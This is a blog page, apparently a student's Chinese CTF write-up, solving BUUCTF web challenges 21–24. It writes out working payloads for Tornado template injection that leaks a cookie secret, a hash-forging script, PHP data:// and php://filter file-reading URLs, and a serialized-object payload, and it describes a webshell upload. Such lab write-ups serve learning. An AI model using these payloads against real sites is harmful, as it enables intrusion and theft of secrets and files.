@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buuctf Web（21-24） | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Buuctf Web（21-24）21、easy_tornado题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中  查看&#x2F;fllllllllllllag，显示Error  并且url变成了&#x2F;error?msg&#x3D;Error  查看&#x2F;welcome.txt，内容为render  12rend">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuctf Web（21-24）">
+<meta property="og:url" content="http://example.com/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="Buuctf Web（21-24）21、easy_tornado题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中  查看&#x2F;fllllllllllllag，显示Error  并且url变成了&#x2F;error?msg&#x3D;Error  查看&#x2F;welcome.txt，内容为render  12rend">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426">
+<meta property="og:image" content="c:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb">
+<meta property="og:image" content="c:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/546f346f-4cc2-4387-99b5-e4f679a198c6">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/eb0d84c7-11ba-4569-86ce-2d852e01f523">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/e02853bf-cf0e-4480-a249-a94d1e290c97">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8647b067-6164-4385-a7a1-3d27b8eb1697">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408">
+<meta property="article:published_time" content="2023-08-11T11:44:06.000Z">
+<meta property="article:modified_time" content="2023-08-12T12:53:14.636Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buuctf Web（21-24）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-11T11:44:06.000Z" itemprop="datePublished">2023-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buuctf Web（21-24）
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（21-24）"><a href="#Buuctf-Web（21-24）" class="headerlink" title="Buuctf Web（21-24）"></a>Buuctf Web（21-24）</h3><h4 id="21、easy-tornado"><a href="#21、easy-tornado" class="headerlink" title="21、easy_tornado"></a>21、easy_tornado</h4><p>题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2" alt="image"></p>
+<p>查看&#x2F;fllllllllllllag，显示Error</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988" alt="image"></p>
+<p>并且url变成了&#x2F;error?msg&#x3D;Error</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2" alt="image"></p>
+<p>查看&#x2F;welcome.txt，内容为render</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure>
+
+<p>查看&#x2F;hints.txt，这是一个加密方法，猜测 要构造<code>filename=/fllllllllllllag&amp;filehash=？</code></p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png" alt="image-20230812150637958"></p>
+<p>在查阅资料后发现Error就是注入点</p>
+<p>本题是模板注入<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入 - 简书 (jianshu.com)</a></p>
+<p>参考资料<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bwangel23/p/4858870.html">Tornado小记 – 模板中的Handler - 黑翼天使23 - 博客园 (cnblogs.com)</a></p>
+<p>获取handler.settings环境变量：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>得到cookie_secret</p>
+<p><code>&#39;cookie_secret&#39;: &#39;caffff81-323f-48da-8323-dc1530a0c95d&#39;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294" alt="image"></p>
+<p>编写脚本</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def Md5(x):</span><br><span class="line">    md5 = hashlib.md5(str(x).encode(&quot;utf8&quot;)).hexdigest()</span><br><span class="line">    return md5</span><br><span class="line">    </span><br><span class="line">print(Md5(&quot;caffff81-323f-48da-8323-dc1530a0c95d&quot;+Md5(&quot;/fllllllllllllag&quot;)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c" alt="image"></p>
+<p>构造<code>/file?filename=/fllllllllllllag&amp;filehash=7d14388e78d85a8f1e726052e9d4dfbd</code></p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5673c2e4-27f7-4962-8d87-f449b8069952&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="22、admin"><a href="#22、admin" class="headerlink" title="22、admin"></a>22、admin</h4><p>注册一个账号</p>
+<p>由于题目叫admin，所以注册时直接用admin了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
+<p>显示用户名已经被注册过</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
+<p>注册一个账号</p>
+<p>由于题目叫admin，所以注册时直接用admin了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
+<p>显示用户名已经被注册过</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
+<p>猜密码</p>
+<p>用123登陆成功了。。。</p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png" alt="image-20230812171109196"></p>
+<p>在网上看大佬解题思路</p>
+<p>注册</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7" alt="image"></p>
+<p>登录，右侧依次查看</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c" alt="image"></p>
+<p>在change password的源代码中看到一个被注释的链接</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee" alt="image"></p>
+<p>访问这个链接，内容已被删除，所以就没再看了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88c07276-46ea-4e23-a50d-ce722b067e0f&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="23、你传你🐎呢"><a href="#23、你传你🐎呢" class="headerlink" title="23、你传你🐎呢"></a>23、你传你🐎呢</h4><p>查看大佬的博客后，了解到，该题需要上传两个文件</p>
+<p>一、<code>.htaccess</code>文件，用来改变文件扩展名</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/546f346f-4cc2-4387-99b5-e4f679a198c6" alt="image"></p>
+<p>上传该文件，抓包，修改Content-Type:image&#x2F;png，send</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/eb0d84c7-11ba-4569-86ce-2d852e01f523" alt="image"></p>
+<p>二、木马文件，用来连接蚁剑</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e02853bf-cf0e-4480-a249-a94d1e290c97" alt="image"></p>
+<p>改名为a.png，上传，抓包，修改Content-Type:image&#x2F;png，send</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8647b067-6164-4385-a7a1-3d27b8eb1697" alt="image"></p>
+<p>用蚁剑连接</p>
+<p>URL：<code>http://f532922c-3101-4cac-ad67-3e8b27c936fe.node4.buuoj.cn:81/upload/535c8c0c4ab4ecda962a1a3922bee31d/a.png</code></p>
+<p>密码：<code>a</code></p>
+<p>没测试成功，试了很久没写出来，留着以后看</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h4><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
+<p>有一个php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
+<p>访问该文件，什么都没有</p>
+<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
+<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
+<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
+<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
+<p>解码</p>
+<p>得到useless.php源码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
+<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
+<p>查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" data-id="cll80vdpg000030vfe67z1lar" data-title="Buuctf Web（21-24）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Buuctf Web（17-20）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 15px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/">Buuctf Web（13-16）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
